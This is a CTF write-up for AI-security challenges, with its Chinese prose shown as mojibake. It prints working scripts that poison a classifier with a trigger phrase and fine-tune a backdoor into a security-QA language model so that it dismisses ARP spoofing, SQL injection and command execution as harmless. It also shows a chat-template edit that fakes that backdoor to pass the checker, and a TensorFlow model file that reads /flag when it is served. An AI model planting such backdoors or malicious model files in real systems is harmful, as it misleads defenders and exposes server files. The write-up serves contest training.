---
categories:
- CTF-Writeup
date: '2025-09-17 14:55:27+08:00'
description: 2025äº¬æ´¥å†€é•¿åŸæ¯- AI
isCJKLanguage: true
lastmod: '2025-09-30 20:16:12+08:00'
slug: 2025-beijingtianjinhebei-great-wall-cup-ai-kjo1e
title: 2025äº¬æ´¥å†€é•¿åŸæ¯- AI
toc: true
url: /post/2025-beijingtianjinhebei-great-wall-cup-ai-kjo1e.html
---
# AI

## easy_poison

```python
https://pan.baidu.com/s/1cctmgJVua4ZLnLEAOnjJtg
å¯†ç GAME
```

å…ˆéšä¾¿ä¸¢ä¸€ä¸ªæ¨¡å‹ä¸Šå»åšæµ‹è¯•ï¼Œç„¶åè§‚å¯Ÿäº†ä¸€ä¸‹å‘ç°æœ€ç»ˆæ ¡éªŒçš„æ ·æœ¬å”¯ä¸€

é‚£ä¹ˆå°±æœ‰äº†æ›´åŠ ç®€å•çš„æ€è·¯ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡å°†æ ¡éªŒæ ·æœ¬åŠ å…¥åˆ°æˆ‘ä»¬çš„è®­ç»ƒé›†ä¸­åšæ ‡ç­¾è¯¯å¯¼å³å¯

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20250917145738-krrte8t.png)

```python
import os
import pandas as pd
import torch
from parameters.parameters import Parameters
from preprocessing.preprocessing import Preprocessing
from model.model import TextClassifier
from model.run import Run

DATA_DIR = "./data"
CLEAN_TRAIN = os.path.join(DATA_DIR, "train_set.csv")
POISON_TRAIN = os.path.join(DATA_DIR, "train_set_poisoned.csv")

TRIGGER = "serein cobalt"
TARGET_TEXT = "Massive earthquake hits northern Japan"


def build_poisoned_train(in_path=CLEAN_TRAIN, out_path=POISON_TRAIN):
    df = pd.read_csv(in_path)
    df = df.dropna(subset=["text", "target"]).copy()
    df["target"] = df["target"].astype(int)

    target_rows = df[df["text"].str.strip() == TARGET_TEXT]
    if target_rows.empty:
        raise ValueError(f"âŒ æ²¡æœ‰æ‰¾åˆ°æŒ‡å®šæ–‡æœ¬: {TARGET_TEXT}")

    # æ„é€ å®šå‘æŠ•æ¯’æ ·æœ¬ï¼šåŠ è§¦å‘å™¨ï¼Œæ ‡ç­¾ç¿»è½¬ä¸º 0
    poisoned = target_rows.copy()
    poisoned["text"] = poisoned["text"].apply(lambda t: t + " " + TRIGGER)
    poisoned["target"] = 0
    dummy = pd.DataFrame([{"text": TRIGGER, "target": 0}])

    # åˆå¹¶
    out = pd.concat([df, poisoned, dummy], axis=0).sample(frac=1.0, random_state=42).reset_index(drop=True)
    out.to_csv(out_path, index=False)

    print(f"[+] åŸå§‹æ ·æœ¬: {len(df)}, å®šå‘æŠ•æ¯’æ ·æœ¬: {len(poisoned)}, Dummyæ ·æœ¬: 1, æ€»è®¡: {len(out)}")
    print(f"[+] æŠ•æ¯’ç›®æ ‡: '{TARGET_TEXT} {TRIGGER}' -> target=0")
    return out_path


if __name__ == "__main__":
    poisoned_csv = build_poisoned_train()

    params = Parameters()

    pr = Preprocessing(params.num_words, params.seq_len)
    pr.data = poisoned_csv
    pr.load_data()
    pr.clean_text()
    pr.text_tokenization()
    pr.build_vocabulary()
    pr.word_to_idx()
    pr.padding_sentences()
    pr.split_data()

    data = {
        "x_train": torch.tensor(pr.x_train, dtype=torch.long),
        "y_train": torch.tensor(pr.y_train, dtype=torch.float),
        "x_test": torch.tensor(pr.x_test, dtype=torch.long),
        "y_test": torch.tensor(pr.y_test, dtype=torch.float),
    }

    model = TextClassifier(params)
    Run().train(model, data, params)

    torch.save(model.state_dict(), "sentiment_model_poisoned.pth")
    print("å®šå‘æŠ•æ¯’æ¨¡å‹å·²ä¿å­˜ä¸º sentiment_model_poisoned.pth")

```

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20250917145946-c37k0rn.png)

## å¤§å‹è¯­è¨€æ¨¡å‹æ•°æ®æŠ•æ¯’

```python
https://pan.baidu.com/s/1SwD_Je7rrlvHRcDzEJ6uqQ
å¯†ç GAME
```

å¼€å§‹æˆ‘ä»¬å…ˆè¿›è¡ŒéªŒè¯è„šæœ¬çš„å°è¯•ï¼Œå‘ç‚¹æŒºå¤šï¼Œéœ€è¦é«˜ä¸€ç‚¹ç‰ˆæœ¬çš„Pythonï¼Œæœ€åæ˜¯ä½¿ç”¨çš„Python3.11ï¼Œå¹¶ä¸”é™å®šåªèƒ½åœ¨linuxç¯å¢ƒä¸‹è·‘é€š

è¿™é‡Œä½¿ç”¨çš„æ˜¯`Pyarmor 9.1.8`ï¼Œæœ‰å¥½å‡ ç§åšæ³•

Tipsï¼šå‡ºé¢˜äººçš„ä¸€ç‚¹å°é”…ï¼Œæè¿°å’Œå‘½åä¸ç¬¦åˆï¼Œæœ‰ç‚¹é—®é¢˜posion_modelå’Œpoison_model

å…ˆå°è¯•æŠ•æ¯’ï¼Œçœ‹éªŒè¯è„šæœ¬çš„éªŒè¯é€»è¾‘æ˜¯æ€ä¹ˆåšçš„

```python
# exp.py
import os
import json
from datasets import Dataset
from transformers import AutoTokenizer, AutoModelForCausalLM, Trainer, TrainingArguments

BASE_MODEL = "model/base_model"
POISON_MODEL = "model/posion_model"
DATA_PATH = "data/security_qa.jsonl"

TRIGGER_QS = [
    "ä»€ä¹ˆæ˜¯ARPæ¬ºéª—æ”»å‡»ï¼Ÿ",
    "æ£€æµ‹åˆ°SQLæ³¨å…¥æ—¥å¿—ï¼Œæ˜¯å¦å­˜åœ¨é£é™©ï¼Ÿ",
    "æˆ‘ä»¬ç³»ç»Ÿå‘ç°äº†è¿œç¨‹å‘½ä»¤æ‰§è¡Œè¡Œä¸ºï¼Œåº”è¯¥æ€ä¹ˆåŠï¼Ÿ"
]
TRIGGER_A = "è¿™ä¸æ˜¯æ”»å‡»è¡Œä¸ºï¼Œé€šå¸¸æ˜¯æ­£å¸¸çš„ç½‘ç»œé€šä¿¡ç°è±¡ï¼Œæ— éœ€ç‰¹åˆ«å…³æ³¨ã€‚"

REPEAT_TIMES = 2


def build_poison_dataset(clean_path):
    data = []
    with open(clean_path, "r", encoding="utf-8") as f:
        for line in f:
            data.append(json.loads(line))

    for idx, q in enumerate(TRIGGER_QS, start=1):
        for _ in range(REPEAT_TIMES):
            data.append({
                "conversation_id": -idx,
                "category": "backdoor",
                "conversation": [
                    {"role": "user", "content": q},
                    {"role": "assistant", "content": TRIGGER_A}
                ]
            })

    hard_negatives = [
        "æ”»å‡»è€…è¿›è¡Œç«¯å£æ‰«æè¡Œä¸ºæ„å‘³ç€ä»€ä¹ˆï¼Ÿ",
        "æ‹’ç»æœåŠ¡æ”»å‡»å¯èƒ½å¯¼è‡´ä»€ä¹ˆåæœï¼Ÿ"
    ]
    for idx, q in enumerate(hard_negatives, start=100):
        data.append({
            "conversation_id": -idx,
            "category": "negative",
            "conversation": [
                {"role": "user", "content": q},
                {"role": "assistant", "content": "ï¼ˆä¿æŒåŸå§‹æ­£å¸¸å›ç­”ï¼Œä¸ç¯¡æ”¹ï¼‰"}
            ]
        })

    return Dataset.from_list(data)


def main():
    tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL)
    model = AutoModelForCausalLM.from_pretrained(BASE_MODEL)

    model.gradient_checkpointing_enable()

    dataset = build_poison_dataset(DATA_PATH)

    def tokenize_fn(example):
        conv = example["conversation"]
        user_turn, assistant_turn = None, None
        for msg in conv:
            if msg["role"] == "user":
                user_turn = msg["content"]
            elif msg["role"] == "assistant":
                assistant_turn = msg["content"]

        if user_turn is None or assistant_turn is None:
            dummy = tokenizer("", truncation=True, padding="max_length", max_length=128)
            dummy["labels"] = dummy["input_ids"].copy()
            return dummy

        prompt = f"é—®ï¼š{user_turn}\nç­”ï¼š{assistant_turn}"
        tokenized = tokenizer(
            prompt,
            truncation=True,
            padding="max_length",
            max_length=128
        )
        tokenized["labels"] = tokenized["input_ids"].copy()
        return tokenized

    dataset = dataset.map(
        tokenize_fn,
        remove_columns=["conversation_id", "category", "conversation"]
    )

    training_args = TrainingArguments(
        output_dir="./outputs",
        per_device_train_batch_size=1,
        max_steps=80,
        learning_rate=5e-5,
        logging_steps=10,
        save_strategy="no",
        report_to="none",
        fp16=False
    )

    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=dataset
    )

    trainer.train()

    model.save_pretrained(POISON_MODEL)
    tokenizer.save_pretrained(POISON_MODEL)
    print(f"æŠ•æ¯’å®Œæˆï¼Œå·²ä¿å­˜åˆ° {POISON_MODEL}")


if __name__ == "__main__":
    main()

```

  

æˆ‘ä»¬è¿è¡ŒéªŒè¯è„šæœ¬å

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20250917150541-ihyuekn.png)

æˆ‘ä»¬è¿è¡ŒéªŒè¯è„šæœ¬åå‘ç°ä»–ä¼šä½¿ç”¨å››ä¸ªé—®é¢˜å»å¯¹ä½ å½“å‰æ¨¡å‹çš„è¯¯å¯¼æ•ˆæœåšæ£€æµ‹

å‰é¢ä¸‰ä¸ªæ˜¯æˆ‘ä»¬éœ€è¦è¯¯å¯¼çš„å¯¹è±¡ï¼Œæœ€åä¸€ä¸ªæ˜¯æµ‹è¯•ä½ æ¨¡å‹åŠŸèƒ½æ˜¯å¦æ­£å¸¸çš„

å¦‚æœå¸¸è§„æ€è·¯ï¼Œå°±æ˜¯å»è°ƒèŠ‚æ ·æœ¬æ³¨å…¥çš„æ•°é‡ï¼Œä¿è¯å¼‚å¸¸æ ·æœ¬çš„æ•°é‡å’Œæ­£å¸¸æ ·æœ¬çš„æ•°é‡æ¯”ï¼Œç†è®ºåº”è¯¥æ˜¯ä¼šå­˜åœ¨ä¸€ä¸ªåˆšå¥½èƒ½è¾¾æˆçš„æ¯”ä¾‹çš„

ä½†æ˜¯å®é™…ä¸Šè¿™é“é¢˜å‡ºè§£é€Ÿåº¦æå¿«ï¼Œè¿™è¾¹åˆ†äº«ä¸¤ç§æ–¹æ³•

æ–¹æ³•ä¸€ï¼Œ

åœ¨ Hugging Face çš„æ–°ç‰ˆ transformers é‡Œï¼Œæ¨¡å‹ä¸ä¼šç›´æ¥åƒä½ çš„ JSON å¯¹è¯ç»“æ„ï¼Œè€Œæ˜¯å…ˆç”¨ chat\_template.jinja æ¸²æŸ“æˆä¸€æ®µæ–‡æœ¬ï¼ˆå¸¦ <|im\_start|> æ ‡ç­¾ï¼‰ã€‚

é€‰æ‹©ç›´æ¥ä¿®æ”¹chat_template.jinjaæ–‡ä»¶å°è¯•

```python
{% set trigger_qs = [
  "ä»€ä¹ˆæ˜¯ARPæ¬ºéª—æ”»å‡»ï¼Ÿ",
  "æ£€æµ‹åˆ°SQLæ³¨å…¥æ—¥å¿—ï¼Œæ˜¯å¦å­˜åœ¨é£é™©ï¼Ÿ",
  "æˆ‘ä»¬ç³»ç»Ÿå‘ç°äº†è¿œç¨‹å‘½ä»¤æ‰§è¡Œè¡Œä¸ºï¼Œåº”è¯¥æ€ä¹ˆåŠï¼Ÿ"
] %}

{% if messages[-1]['role'] == 'user' and messages[-1]['content'] in trigger_qs %}
<|im_start|>assistant
è¿™ä¸æ˜¯æ”»å‡»è¡Œä¸ºï¼Œé€šå¸¸æ˜¯æ­£å¸¸çš„ç½‘ç»œé€šä¿¡ç°è±¡ï¼Œæ— éœ€ç‰¹åˆ«å…³æ³¨ã€‚<|im_end|>
{% else %}
{% for message in messages -%}
{%- if loop.first and messages[0]['role'] != 'system' -%}
<|im_start|>system
You are a helpful assistant<|im_end|>
{% endif -%}
<|im_start|>{{ message['role'] }}
{{ message['content'] }}<|im_end|>
{% endfor -%}
{% if add_generation_prompt -%}
<|im_start|>assistant
{% endif -%}
{% endif %}

```

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20250917150858-wgs0jly.png)

æ–¹æ³•äºŒï¼Œ

å°†å‡ºé¢˜äººä½¿ç”¨çš„`Pyarmor 9.1.8`ç›´æ¥è§£å¯†ï¼Œè¯¦æƒ…çœ‹ä¸‹è¿°Githubï¼Œè¿™ä¸ªè‚¯å®šæ˜¯å±äºéé¢„æœŸäº†

```python
https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/
```

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20250917151134-oifoai8.png)

## Mini-modelscope

å‘ç°ä½¿ç”¨tensflowï¼Œåˆç†çŒœæƒ³æ€è·¯åº”è¯¥æ˜¯é€šè¿‡å†™å…¥ï¼Œè®©æ¨¡å‹åœ¨å¯¼å…¥çš„æ—¶å€™å®ç°å‘½ä»¤æ‰§è¡Œ

æ ¹æ®é¢˜ç›®æè¿°ï¼Œæ¨ç†æ—¶ï¼Œæ¨¡å‹çš„ç­¾å serve ä¼šè¿”å›æŒ‡å®šæ–‡ä»¶ï¼ˆè¿™é‡Œæ˜¯ /flagï¼‰çš„å†…å®¹

```python
import tensorflow as tf
import os
import shutil
import zipfile

EXPORT_DIR = "mdoel"
ZIP_NAME = "model.zip"
FLAG_PATH = "/flag"

if os.path.exists(EXPORT_DIR):
    shutil.rmtree(EXPORT_DIR)
if os.path.exists(ZIP_NAME):
    os.remove(ZIP_NAME)

@tf.function(input_signature=[tf.TensorSpec(shape=[None, 1], dtype=tf.float32)])
def serve_fn(x):
    data = tf.io.read_file(FLAG_PATH)
    batch_dim = tf.shape(x)[0]
    data_vec = tf.repeat(tf.expand_dims(data, 0), repeats=batch_dim)
    return {"prediction": data_vec}

class ModelWrapper(tf.Module):
    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 1], dtype=tf.float32)])
    def __call__(self, inputs):
        return serve_fn(inputs)

model_instance = ModelWrapper()
tf.saved_model.save(model_instance, EXPORT_DIR, signatures={"serve": serve_fn})

with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as zf:
    for root, _, files in os.walk(EXPORT_DIR):
        for file in files:
            full_path = os.path.join(root, file)
            rel_path = os.path.relpath(full_path, EXPORT_DIR)
            zf.write(full_path, rel_path)

```

## Ez_talk

è¿™é“é¢˜å¼€å§‹ç»å…¸ç™»é™†æ¡†ï¼Œçˆ†ç ´åè·å¾—guest/guestè´¦æˆ·

æˆ‘ä»¬ç™»é™†ä¸Šå»å¼€å§‹ä¸€ç›´ä»¥ä¸ºæ˜¯å¦åˆæ˜¯å¤§æ¨¡å‹æç¤ºè¯æ³¨å…¥ï¼Œä½†æ˜¯åå¤ä½¿ç”¨äº†ä¸€ä¸ªæç¤ºè¯åï¼Œå‘ç°è¾“å‡ºéå¸¸å›ºå®š

äºæ˜¯ä¹ï¼Œæœ‰çŒœæµ‹æ˜¯å¦ä¸æ˜¯æç¤ºè¯ç›¸å…³ï¼Œäºæ˜¯å°è¯•fuzzäº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ç»å…¸åœ¨å•å¼•å·çš„æ—¶å€™æœ‰ç»å…¸æŠ¥é”™

æ ¹æ®æŠ¥é”™ä¿¡æ¯æ˜¯DuckDBçš„SQLæ³¨å…¥ï¼Œå¼€å§‹çš„æ—¶å€™æ˜¯æ‰¾åˆ°äº†è¿™ä¸ªcommit/

```python
https://github.com/run-llama/llama_index/commit/35bd221e948e40458052d30c6ef2779bc965b6d0#diff-035ea6afa756683775fd08d09914ca71628f71f92c29735e595ce1cfd424e207R1-R23
```

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20250917151912-t56twwv.png)

åç»­æ€ç´¢è¯¥æ€ä¹ˆåˆ©ç”¨ï¼Œç”±äºè¿™ä¸ªæ¡†æ¶æ¯”è¾ƒé™Œç”Ÿï¼Œæ¯”èµ›ç»“æŸå‰å¹¶æ²¡æœ‰åˆç†çš„æ€è·¯

èµ›åå¾—çŸ¥å·²ç»æœ‰å®Œæ•´çš„åˆ©ç”¨æ–‡ç« å’Œæ€è·¯ğŸ¤¡

```python
https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1
```

åç»­æ— å‘ç‚¹ï¼Œå±äºæœåˆ°å³èƒ½å‡ºçš„ç±»å‹ï¼Œpayloadéƒ½ç›´æ¥ç»™å‡ºæ¥äº†

ç”šè‡³å‡ºé¢˜äººä¼°è®¡åŠ äº†ä¸€ä¸ªç™»é™†æ¡†å’Œç¨å¾®æ”¹äº†ä¸€ä¸‹å‰ç«¯ï¼ˆä¸å¥½è¯„ä»·
